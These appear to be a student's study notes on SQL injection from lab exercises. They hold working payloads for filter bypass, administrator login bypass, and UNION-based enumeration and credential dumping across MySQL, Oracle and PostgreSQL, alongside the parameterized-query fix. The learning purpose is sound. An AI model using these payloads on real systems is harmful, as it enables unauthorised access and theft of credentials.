# Web Hacking Notes

---

# Chapter 1 — SQL Injection

---

## 1. What is SQL Injection?

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It allows an attacker to view data they are not normally able to retrieve, bypass authentication, and in some cases modify or delete data.

**Why it happens:** Applications that directly insert user input into SQL queries without sanitization are vulnerable.

**Vulnerable code:**
```python
cursor.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'")
```

**Safe code — parameterized query:**
```python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

> Parameterized queries completely prevent SQL injection. Always the fix.

---

## 2. The Single Quote Test

The universal first step in testing for SQL injection.

```
Add ' to any input field or URL parameter
```

| Result | Meaning |
|---|---|
| Page breaks or shows error | SQL injection likely possible |
| Page loads normally | May still be vulnerable — try other techniques |
| Database error visible | Definitely vulnerable — error-based SQLi possible |

---

## 3. Comment Markers by Database

Comments allow you to remove the rest of the SQL query after your injection.

| Database | Comment Syntax | Notes |
|---|---|---|
| MySQL | `--+` or `#` | Space required after `--` so use `--+` in URLs |
| Microsoft SQL Server | `--` | Space after `--` |
| Oracle | `--` | Space after `--` |
| PostgreSQL | `--` | Space after `--` |

> In URLs, spaces become `+` so MySQL comment is always written as `--+`

---

## 4. Attack Type 1 — WHERE Clause Manipulation

**Goal:** Retrieve hidden data by manipulating filter conditions in a URL parameter.

**When to use this:**
Any URL parameter that filters data — category, id, search, sort, type
Anything you see in the URL like `?category=` `?id=` `?search=`

**Step 1 — Find the injection point:**
```
Look at the URL — find parameters like filter?category=Gifts
Add a single quote: filter?category=Gifts'
If page breaks = injection possible
```

**Step 2 — Confirm injection with comment:**
```
filter?category=Gifts'--
```
If page behavior changes = comment worked, WHERE conditions modified

**Step 3 — Make condition always true:**
```
filter?category='+OR+1=1--
```
`OR 1=1` is always true = removes all filter conditions = all hidden data shown

**What happens to the query:**
```sql
-- Original query:
SELECT * FROM products WHERE category='Gifts' AND released=1

-- After injection:
SELECT * FROM products WHERE category='' OR 1=1--
-- The AND released=1 is commented out, all products returned
```

**Rule:** Find parameter → break the query → make condition always true → dump all data

---

## 5. Attack Type 2 — Authentication Bypass

**Goal:** Log in as any user without knowing the password.

**When to use this:**
Any login form — username field is the primary target
Works when the application concatenates input directly into SQL

**Step 1 — Understand the target query:**
```sql
SELECT * FROM users WHERE username='input' AND password='input'
```
Target: eliminate the `AND password` check entirely

**Step 2 — Inject into username field:**
```
Username: administrator'--
Password: anything or leave empty
```

**Step 3 — What happens to the query:**
```sql
-- Original:
SELECT * FROM users WHERE username='input' AND password='input'

-- After injection:
SELECT * FROM users WHERE username='administrator'--' AND password=''
-- Everything after -- is ignored
-- Database finds administrator, no password check runs
```

**Common usernames to try:**
```
administrator
admin
root
sa
user
```

**Rule:** Single quote closes the string, `--` removes password check, log in as any known username with no password needed.

---

## 6. Attack Type 3 — UNION Attack

**Goal:** Append a second SELECT query to retrieve data from other tables or database functions.

**Why UNION attacks work:**
UNION combines the results of two SELECT queries into one result set. We inject a second SELECT that retrieves data we want from anywhere in the database.

**Step 1 — Find number of columns:**

Start with 1 NULL, keep adding until no error:
```
'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+
'+UNION+SELECT+NULL,NULL,NULL--+
```
Stop when products appear on page = correct number of columns found.

**Why NULL:**

| Option | Problem |
|---|---|
| Number like `1` | May cause type mismatch if column expects text |
| Text like `'a'` | May cause type mismatch if column expects number |
| `NULL` | Compatible with any data type — always works |

**Step 2 — Find which columns display text:**

Replace NULLs one by one with the letter `a`:
```
'+UNION+SELECT+'a',NULL--+
'+UNION+SELECT+NULL,'a'--+
```
Whichever shows `a` on the page = that column accepts text output and can display your results.

**Step 3 — Extract what you want:**

Put your payload in the identified text column:
```sql
-- Get database version (MySQL):
'+UNION+SELECT+@@version,NULL--+

-- Get database version (Oracle):
'+UNION+SELECT+BANNER,NULL+FROM+v$version--

-- Get all table names:
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+

-- Get columns from a specific table:
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+

-- Dump usernames and passwords:
'+UNION+SELECT+username,password+FROM+users--+
```

**Database syntax differences:**

| Database | Comment | Version | Tables reference |
|---|---|---|---|
| MySQL | `--+` | `@@version` | `information_schema.tables` |
| Microsoft SQL | `--` | `@@version` | `information_schema.tables` |
| Oracle | `--` | `v$version` BANNER column | `all_tables` |
| PostgreSQL | `--` | `version()` function | `information_schema.tables` |

> Oracle also requires `FROM DUAL` when selecting without a table — e.g. `'+UNION+SELECT+NULL,NULL+FROM+DUAL--`

**Rule:** Find columns → find text columns → extract target data. Never guess. Always follow the 3 steps.

---

## 7. Attack Type 4 — Listing Database Contents

**Goal:** Enumerate all tables and columns, then extract credentials.

### Non-Oracle Databases (PostgreSQL, MySQL, MSSQL)

```sql
-- Step 1: List application tables only (filter system tables)
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema='public'--

-- Step 2: Get columns from target table
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxx'--

-- Step 3: Extract credentials
'+UNION+SELECT+username_col,password_col+FROM+users_xxxx--
```

> Always use `WHERE table_schema='public'` on PostgreSQL — without it you get hundreds of system tables and the users table gets buried.

### Oracle Databases

```sql
-- Step 1: List application tables
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+owner+NOT+IN+('SYS','SYSTEM','MDSYS','CTXSYS','XDB')--

-- Or filter by name pattern:
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+table_name+LIKE+'USERS%'--

-- Step 2: Get columns
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXX'--

-- Step 3: Extract credentials
'+UNION+SELECT+username_col,password_col+FROM+USERS_XXXX--
```

### Oracle vs PostgreSQL Key Differences

| Task | PostgreSQL | Oracle |
|---|---|---|
| List tables | `information_schema.tables` | `all_tables` |
| Filter app tables | `WHERE table_schema='public'` | `WHERE owner NOT IN (...)` |
| List columns | `information_schema.columns` | `all_tab_columns` |
| Dummy table | Not needed | `FROM dual` |

---

## 8. Error Recognition

**How to know if your payload worked:**

| Page behavior | Meaning |
|---|---|
| Blank white page | Wrong number of columns or wrong syntax |
| Internal Server Error | Wrong syntax, likely injection point confirmed |
| No products shown | Wrong column count in UNION |
| Products appear normally | Payload accepted, syntax correct |
| Your data appears on page | Full success — data extracted |

**Rule:** Page loads = accepted. Page breaks = wrong syntax or wrong column count.

---

## 9. information_schema — The Database Map

`information_schema` is a special database that every MySQL and MSSQL database has. It contains metadata about all other databases, tables, and columns. Learning to query it is essential for UNION attacks.

```sql
-- List all tables in current database:
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- List all columns in a specific table:
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- List all databases:
SELECT schema_name FROM information_schema.schemata
```

> Think of information_schema as the blueprint of the entire database. Once you can query it, you can find and extract anything.

---

## 10. Labs Completed

### Lab 1 — SQL Injection WHERE Clause (Retrieval of Hidden Data)

| Field | Detail |
|---|---|
| Vulnerability | Category filter URL parameter not sanitized |
| Injection point | `filter?category=` |
| Payload | `'+OR+1=1--` |
| Result | All hidden and unreleased products became visible |

```sql
SELECT * FROM products WHERE category='' OR 1=1--
```

---

### Lab 2 — SQL Injection Login Bypass

| Field | Detail |
|---|---|
| Vulnerability | Login form username field not sanitized |
| Injection point | Username input field |
| Payload | `administrator'--` |
| Result | Logged in as administrator without password |

```sql
SELECT * FROM users WHERE username='administrator'--' AND password=''
```

---

### Lab 3 — Querying Database Version on Oracle

| Field | Detail |
|---|---|
| Vulnerability | Category filter vulnerable to UNION-based SQLi |
| Injection point | `filter?category=` |
| Find columns payload | `'+UNION+SELECT+NULL,NULL+FROM+DUAL--` |
| Get version payload | `'+UNION+SELECT+BANNER,NULL+FROM+v$version--` |
| Key learning | Oracle requires FROM DUAL, version in v$version table |

---

### Lab 4 — Querying Database Version on MySQL

| Field | Detail |
|---|---|
| Vulnerability | Category filter vulnerable to UNION-based SQLi |
| Injection point | `filter?category=` |
| Find columns payload | `'+UNION+SELECT+NULL,NULL--+` |
| Get version payload | `'+UNION+SELECT+@@version,NULL--+` |
| Key learning | MySQL uses @@version, comment needs --+ not just -- |

---

### Lab 5 — Listing Database Contents (Non-Oracle / PostgreSQL)

| Field | Detail |
|---|---|
| Vulnerability | Category filter vulnerable to UNION-based SQLi |
| Database | PostgreSQL |
| Goal | Find users table, extract administrator credentials, login |
| Key payload | `WHERE table_schema='public'` to filter system tables |
| Users table | Had randomized suffix e.g. `users_geykji` |
| Result | Extracted administrator username and password, logged in |

**Full attack chain:**
```sql
-- List tables
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema='public'--

-- List columns
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_geykji'--

-- Extract credentials
'+UNION+SELECT+username_vjxamm,password_mqyarm+FROM+users_geykji--
```

---

### Lab 6 — Listing Database Contents (Oracle)

| Field | Detail |
|---|---|
| Vulnerability | Category filter vulnerable to UNION-based SQLi |
| Database | Oracle |
| Goal | Find users table, extract administrator credentials, login |
| Key difference | Use `all_tables` and `all_tab_columns` instead of information_schema |
| Result | Extracted administrator credentials and logged in |

**Full attack chain:**
```sql
-- List tables (filter to app tables only)
'+UNION+SELECT+table_name,NULL+FROM+all_tables+WHERE+table_name+LIKE+'USERS%'--

-- List columns
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXX'--

-- Extract credentials
'+UNION+SELECT+username_col,password_col+FROM+USERS_XXXX--
```

---

## 11. Key Takeaways

- SQL injection exploits trust — the database trusts whatever the application sends it
- Single quote `'` is the universal test character — always try it first
- `--` comments out the rest of the query in most databases
- `OR 1=1` makes any condition always true
- UNION attacks let you retrieve data from any table in the database
- `information_schema` is the map of the entire database for non-Oracle DBs
- Oracle uses `all_tables` and `all_tab_columns` — no `information_schema`
- Always filter by `table_schema='public'` on PostgreSQL to avoid system table noise
- Parameterized queries completely prevent SQL injection
- Different databases have different syntax — know Oracle, MySQL, MSSQL, PostgreSQL differences
- Every login form that concatenates input is potentially bypassable
- The methodology never changes — test → confirm → exploit → extract

---

# Chapter 2 — Cross-Site Scripting (XSS)

*Coming soon — Sem 5*

---

# Chapter 3 — Authentication Vulnerabilities

*Coming soon — Sem 5*

---
